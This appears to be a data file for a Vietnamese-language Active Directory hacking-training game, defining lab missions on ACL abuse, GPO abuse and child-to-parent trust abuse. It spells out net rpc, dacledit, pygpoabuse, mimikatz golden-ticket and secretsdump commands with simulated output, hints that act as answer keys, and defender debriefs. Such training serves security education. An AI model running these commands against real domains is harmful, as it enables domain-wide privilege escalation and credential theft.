      { term: 'SharpHound', def: 'Ingestor thu thập dữ liệu thô (user, group, ACL, session) từ domain để nạp vào BloodHound.' },
      { term: 'Shortest path', def: 'Query đồ thị tìm đường ngắn nhất từ một node (vd account của attacker) tới mục tiêu (vd Domain Admins).' },
      { term: 'Attack path', def: 'Chuỗi quyền/quan hệ (ACL, group, session) liên tiếp nhau dẫn từ một điểm chiếm được tới quyền cao hơn.' },
    ],
    debrief: [
      'Trong AD lớn (hàng nghìn object), quan hệ ACL phức tạp tới mức không ai — kể cả admin — nắm hết bằng mắt; BloodHound biến bài toán "ai có quyền gì trên ai" thành một bài toán đồ thị máy tính giải trong giây.',
      'Một đường tấn công thường ngắn đến ngạc nhiên: 2-3 hop từ một account thường tới Domain Admins là phổ biến, vì các quyền "tưởng vô hại" (GenericAll trên 1 user, member của 1 group) xếp chồng lên nhau.',
      'BloodHound không tự tấn công — nó chỉ CHỈ ĐƯỜNG; bước khai thác thực tế (đổi password, WriteDACL, AddMember) vẫn cần công cụ riêng (net rpc, dacledit, impacket) như ở bài tiếp theo.',
      'DEFENDER: chính defender cũng nên tự chạy BloodHound định kỳ trên domain mình để tìm và cắt các đường tấn công ẩn TRƯỚC khi attacker tìm ra; coi mọi quyền GenericAll/WriteDACL/Owns từ account thường lên group nhạy cảm là một lỗ hổng cần vá, không phải "chuyện vặt".',
    ],
    initialFilesystem: fsC9M11,
  },
  {
    id: 12,
    chapterId: 9,
    title: 'Đi hết đường ACL: GenericAll → WriteDACL → AddMember',
    story:
      'BloodHound đã chỉ đường: hacker -GenericAll-> it_helpdesk -WriteDACL-> Domain Admins. Giờ là lúc đi đúng 2 bước đó bằng tay. Bước 1: GenericAll trên it_helpdesk cho phép đổi mật khẩu account đó. Bước 2: WriteDACL của it_helpdesk trên group Domain Admins cho phép TỰ CẤP quyền AddMember cho chính nó, rồi thêm hacker vào.',
    steps: [
      {
        id: 'reset_password',
        description: 'Lạm dụng GenericAll: đổi mật khẩu it_helpdesk không cần biết mật khẩu cũ',
        match: /net\s+rpc\s+password|samr::changepassword|set\s+password.*it_helpdesk/i,
        output: [
          'net rpc password it_helpdesk newP@ssw0rd123 -U corp.local/hacker%pass -S 10.10.10.5',
          'Password changed for user it_helpdesk',
        ].join('\n'),
      },
      {
        id: 'grant_addmember',
        description: 'Dùng it_helpdesk (đã chiếm) lạm dụng WriteDACL: tự cấp quyền AddMember trên Domain Admins',
        match: /dacledit.*addmember|add.*ace.*addmember|grant.*addmember/i,
        output: [
          'dacledit.py -action write -rights WriteMembers -principal it_helpdesk -target "Domain Admins" corp.local/it_helpdesk:newP@ssw0rd123',
          '[*] DACL backed up to dacledit-20260626-backup.bak',
          '[*] DACL modified successfully — it_helpdesk now has WriteMembers (AddMember) on "Domain Admins"',
        ].join('\n'),
      },
      {
        id: 'add_member',
        description: 'Thêm chính hacker vào group Domain Admins',
        match: /net\s+rpc\s+group\s+addmem|addmember.*domain\s*admins/i,
        output: [
          'net rpc group addmem "Domain Admins" hacker -U corp.local/it_helpdesk%newP@ssw0rd123 -S 10.10.10.5',
          'Added member \'hacker\' to group \'Domain Admins\'',
        ].join('\n'),
      },
      { id: 'capture_flag', description: 'Xác minh và đọc flag trên DC ở /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'Đi đúng 2 hop BloodHound đã chỉ: GenericAll cho phép đổi mật khẩu, WriteDACL cho phép sửa quyền truy cập của group.',
      'Bước 1: `net rpc password it_helpdesk newP@ss -U corp.local/hacker%pass -S 10.10.10.5` (GenericAll cho phép reset mật khẩu user khác không cần mật khẩu cũ).',
      'Bước 2: với creds it_helpdesk mới, dùng `dacledit.py -action write -rights AddMember -principal it_helpdesk -target "Domain Admins" corp.local/it_helpdesk:newP@ssw0rd123` để grant AddMember, rồi `net rpc group addmem "Domain Admins" hacker ...`, đọc flag bằng `cat /root/.flag`.',
    ],
    terms: [
      { term: 'GenericAll', def: 'Quyền ACL "toàn quyền" trên một object — bao gồm cả đổi mật khẩu (nếu object là user) hoặc sửa mọi thuộc tính.' },
      { term: 'WriteDACL', def: 'Quyền sửa chính DACL (Discretionary ACL) của một object — nghĩa là tự cấp thêm quyền khác cho bất kỳ ai, kể cả chính mình.' },
      { term: 'AddMember / WriteMembers', def: 'Quyền cụ thể cho phép thêm thành viên mới vào một group AD — mục tiêu cuối của chuỗi WriteDACL trên group.' },
      { term: 'dacledit', def: 'Công cụ (BloodyAD/impacket) đọc và sửa DACL của object AD — dùng để tự cấp quyền sau khi có WriteDACL.' },
    ],
    debrief: [
      'Mỗi quyền riêng lẻ trong chuỗi này (GenericAll trên 1 helpdesk account, WriteDACL của helpdesk lên 1 group) nhìn tách biệt có thể "chấp nhận được" về business — chỉ khi XẾP CHUỖI lại mới hiện ra đường tới Domain Admins.',
      'WriteDACL là quyền đặc biệt nguy hiểm vì nó là quyền "tự nhân bản" quyền: có WriteDACL trên BẤT KỲ object nào, attacker tự cấp cho mình bất kỳ quyền khác (AddMember, GenericAll, ResetPassword) trên chính object đó.',
      'Toàn bộ chuỗi không chạm DC, không cần exploit kỹ thuật — chỉ là dùng đúng API quản trị AD (net rpc, LDAP modify) theo cách thiết kế cho phép, một lần nữa là "lạm dụng tính năng" không phải lỗi phần mềm.',
      'DEFENDER: kiểm toán định kỳ ai có WriteDACL/GenericAll trên group nhạy cảm (Domain Admins, Enterprise Admins) — quyền này KHÔNG nên gán cho group helpdesk/service; giám sát Event 4738 (đổi mật khẩu) và 4728/4756 (thêm member group nhạy) gắn cờ alert tức thì.',
    ],
    initialFilesystem: fsC9M12,
  },
  {
    id: 13,
    chapterId: 9,
    title: 'Lạm dụng GPO toàn OU',
    story:
      'Domain Admins đã trong tay nhưng mày muốn một con đường gọn hơn cho lần sau: BloodHound lộ ra hacker có quyền sửa GPO "IT-Workstations-Policy", đang link tới cả OU chứa máy phòng IT. Một GPO bị lạm dụng không chỉ chiếm 1 máy — nó chiếm MỌI máy trong OU cùng lúc, lần áp policy kế tiếp.',
    steps: [
      {
        id: 'find_gpo_rights',
        description: 'Xác nhận hacker có quyền sửa GPO nào và GPO đó link OU nào',
        match: /get-gpo|gplink|writegpo|genericwrite.*gpo/i,
        output: [
          'BloodHound edge: hacker -[GenericWrite]-> GPO "IT-Workstations-Policy"',
          'GPO "IT-Workstations-Policy" -[GPLink]-> OU=IT,DC=corp,DC=local',
          '[*] OU=IT contains 14 computer objects (all IT staff workstations).',
        ].join('\n'),
      },
      {
        id: 'abuse_gpo',
        description: 'Dùng pyGPOAbuse/SharpGPOAbuse thêm immediate scheduled task chạy SYSTEM',
        match: /gpoabuse|pygpoabuse|sharpgpoabuse/i,
        output: [
          'pygpoabuse.py corp.local/hacker:pass -gpo-id {3F2A91C0-...} -command "cmd /c net localgroup administrators hacker /add"',
          '[*] Connecting to LDAP',
          '[*] Adding ScheduledTask to GPO "IT-Workstations-Policy"',
          '[*] Task will run as SYSTEM on next policy refresh for every computer in OU=IT',
        ].join('\n'),
      },
      {
        id: 'force_refresh',
        description: 'Mô phỏng: chờ/force máy trong OU áp policy mới (gpupdate)',
        match: /gpupdate\s*\/force|wait.*policy.*refresh/i,
        output: [
          '[Simulated] WS-IT-07 applied new GPO at next refresh cycle (gpupdate /force)',
          '[Simulated] Scheduled task executed as NT AUTHORITY\\SYSTEM',
          '[Simulated] hacker added to local Administrators group on WS-IT-07',
        ].join('\n'),
      },
      { id: 'capture_flag', description: 'Trên WS-IT-07 với quyền local admin mới, đọc /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'Quyền sửa GPO không chiếm 1 máy — nó chiếm MỌI máy trong OU mà GPO đó link tới, ngay lần policy refresh kế tiếp.',
      'Xác nhận quyền + scope: `echo "GenericWrite on GPO IT-Workstations-Policy, GPLink to OU=IT"` (mô phỏng BloodHound). Dùng `pygpoabuse.py corp.local/hacker:pass -gpo-id <GUID> -command "..."` để chèn scheduled task SYSTEM.',
      'Task chạy SYSTEM sẽ tự thêm hacker vào local Administrators trên TẤT CẢ máy trong OU=IT khi `gpupdate /force` (hoặc refresh tự động ~90 phút). Sau đó vào một máy, đọc flag bằng `cat /root/.flag`.',
    ],
    terms: [
      { term: 'GPO', def: 'Group Policy Object — tập cấu hình (registry, script, scheduled task...) áp đặt tự động xuống mọi máy/user trong OU mà nó link tới.' },
      { term: 'GPLink', def: 'Liên kết giữa một GPO và một OU — xác định GPO đó áp dụng cho object nào trong domain.' },
      { term: 'GPO abuse', def: 'Lạm dụng quyền sửa GPO để chèn scheduled task/script độc hại, tự động thực thi SYSTEM trên mọi máy trong scope của GPO.' },
      { term: 'gpupdate', def: 'Lệnh Windows ép máy áp ngay chính sách GPO mới nhất thay vì chờ chu kỳ refresh tự động (~90 phút).' },
    ],
    debrief: [
      'GPO là một trong những bàn đạp "âm thầm nhưng diện rộng" nhất trong AD: một quyền ghi tưởng nhỏ trên 1 object GPO có thể tự động thực thi mã trên HÀNG CHỤC máy cùng lúc mà không cần exploit gì.',
      'Khác các kỹ thuật trước (nhắm 1 account/1 máy), GPO abuse là tấn công "quy mô" — phù hợp khi attacker muốn duy trì truy cập lâu dài (persistence) trên toàn bộ một nhóm máy, không chỉ chiếm 1 lần.',
      'Vì GPO thực thi với quyền SYSTEM trên máy đích, bất kỳ ai sửa được GPO hiệu quả tương đương có quyền admin local trên TOÀN BỘ OU mà GPO áp — kể cả khi họ không phải Domain Admin.',
      'DEFENDER: giới hạn nghiêm ngặt ai có quyền Edit/Write trên GPO (mặc định chỉ Domain/Enterprise Admins); giám sát Event log GPO change (Group Policy Object Auditing); rà soát định kỳ GPLink để biết GPO nào áp lên OU nhạy cảm (tier-0).',
    ],
    initialFilesystem: fsC9M13,
  },
  {
    id: 14,
    chapterId: 9,
    title: 'Trust Abuse — Child sang Parent Domain',
    story:
      'Domain mày vừa hạ (child.corp.local) chỉ là một domain con trong forest. Forest root corp.local (parent) tin tưởng child.corp.local theo kiểu 2-way transitive trust — và đó chính là cửa sau. Với trust key của child, mày forge một vé Kerberos mang SID lịch sử của Enterprise Admins, lừa parent cấp quyền truy cập cao nhất toàn forest.',
    steps: [
      {
        id: 'get_trust_key',
        description: 'DCSync child.corp.local để lấy trust key liên-domain với parent',
        match: /lsadump::trust|dcsync.*trust|trust\s*key/i,
        output: [
          'mimikatz # lsadump::trust /patch',
          'Current domain: child.corp.local (childcorp / S-1-5-21-AAA)',
          '-> Domain: corp.local (parentcorp / S-1-5-21-BBB)',
          '   [ Out ] corp.local -> child.corp.local',
          '   [ In  ] child.corp.local -> corp.local',
          '* Inter-Realm Trust Key (RC4) : 5d41402abc4b2a76b9719d911017c592',
        ].join('\n'),
      },
      {
        id: 'forge_ticket',
        description: 'Forge inter-realm TGT mang SID history = Enterprise Admins của corp.local',
        match: /golden.*sids|kerberos::golden.*sid|sid\s*history/i,
        output: [
          'mimikatz # kerberos::golden /user:hacker /domain:child.corp.local /sid:S-1-5-21-AAA /sids:S-1-5-21-BBB-519 /rc4:5d41402abc4b2a76b9719d911017c592 /ticket:trust.kirbi',
          '[*] /sids:S-1-5-21-BBB-519 = Enterprise Admins of corp.local (PARENT) injected into SID history',
          'Golden ticket for \'hacker @ child.corp.local\' successfully submitted for current session',
        ].join('\n'),
      },
      {
        id: 'cross_realm_dcsync',
        description: 'Dùng vé forge xin TGS sang DC của parent, DCSync ngược corp.local',
        match: /dcsync.*corp\.local(?!.*child)|secretsdump.*corp\.local/i,
        output: [
          'secretsdump.py -k -no-pass corp.local/Administrator@dc-parent.corp.local -just-dc-ntlm',
          '[*] Using Kerberos Cache: trust.kirbi',
          '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
          'corp.local\\krbtgt:502:aad3b...:8f4b2c9e...   <-- FULL forest compromise',
        ].join('\n'),
      },
      { id: 'capture_flag', description: 'Trên DC của domain PARENT, đọc /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'Trust giữa domain con và forest root là 2-way — child KHÔNG nên tin được parent, nhưng trust key bị lộ thì lại làm được đúng điều đó qua SID history injection.',
      'Lấy trust key: `mimikatz # lsadump::trust /patch` trên child.corp.local (đã DCSync xong domain con).',
      'Forge: `kerberos::golden /user:hacker /domain:child.corp.local /sid:<SID child> /sids:<SID Enterprise Admins parent>-519 /rc4:<trust key> /ticket:trust.kirbi`, rồi `secretsdump.py -k -no-pass corp.local/...@dc-parent... -just-dc-ntlm`, cuối cùng `cat /root/.flag` trên DC parent.',
    ],
    terms: [
      { term: 'Forest trust', def: 'Quan hệ tin tưởng giữa domain con và forest root (hoặc giữa 2 forest), thường 2-way transitive, cho phép user domain này truy cập tài nguyên domain khác.' },
      { term: 'Inter-realm trust key', def: 'Khóa bí mật dùng để mã hoá vé Kerberos liên-domain giữa 2 domain có quan hệ trust — DCSync domain con là lấy được khóa này.' },
      { term: 'SID history', def: 'Thuộc tính lưu các SID cũ của một object (thường dùng khi migrate domain) — Windows vẫn cấp quyền dựa trên CẢ SID history, không chỉ SID hiện tại.' },
      { term: 'Golden ticket liên-domain', def: 'Forge TGT không chỉ với quyền trong domain hiện tại, mà tiêm thêm SID history của group cấp cao ở domain/forest khác để leo xuyên trust boundary.' },
    ],
    debrief: [
      'Trong một forest AD, "child domain" thường được giới thiệu là ranh giới quản trị độc lập — nhưng về bảo mật, CHILD DOMAIN BỊ HẠ = TOÀN BỘ FOREST BỊ HẠ, vì trust key liên-domain luôn lộ ra khi DCSync domain con.',
      'SID history vốn được thiết kế cho mục đích hợp pháp (giữ quyền truy cập khi migrate user giữa domain) — nhưng AD không thực sự kiểm tra SID history có "chính đáng" hay không, mở đường cho forge.',
      'Cuộc tấn công không chạm gì tới parent domain cho tới bước cuối — toàn bộ "vũ khí" (trust key, golden ticket) được chế tạo hoàn toàn trên domain con đã chiếm, rồi bắn một phát DCSync duy nhất sang parent.',
      'DEFENDER: coi MỌI child domain trong forest là một phần của tier-0 (không có "domain con ít quan trọng hơn" về bảo mật forest); SID Filtering trên trust boundary (đặc biệt forest trust ngoài tổ chức) để chặn SID history injection; giám sát chặt DCSync và truy vấn trust key (Event 4662 với GUID DS-Replication).',
    ],
    initialFilesystem: fsC9M14,
  },
];
